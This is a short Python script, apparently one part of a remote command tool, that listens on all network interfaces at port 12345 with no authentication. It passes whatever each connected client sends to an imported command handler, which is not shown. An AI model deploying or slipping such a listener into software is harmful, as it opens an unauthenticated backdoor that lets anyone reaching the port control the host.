# Command Executor

import socket
from handler import handle_command
import os

HOST = "0.0.0.0"
PORT = 12345
BUF_SIZE = 4096

def start_server():
    
    while True:
        s = socket.socket(
            socket.AF_INET, # IPv4
            socket.SOCK_STREAM # TCP conn
        )
        
        os.chdir(os.getcwd())
        
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"[+] Listening for connection on port {PORT}")
        
        conn, addr = s.accept()
        # print(f"[+] Connected by {addr}")
        
        while True:
            try:
                data = conn.recv(BUF_SIZE)
                print("retrieved data:", data.decode())
                if not data: 
                    break
                
                resp, stat = handle_command(data, conn)
                if resp and stat == 1:
                    conn.sendall(resp.encode())
                else: # exit
                    conn.sendall(resp.encode())
                    print(resp)
                    
                    s.close()
                    conn.close()
                    break
                
            except Exception as e:
                conn.sendall(f"[ERRSER_Main] Error: {e}".encode())


if __name__ == "__main__":
    start_server()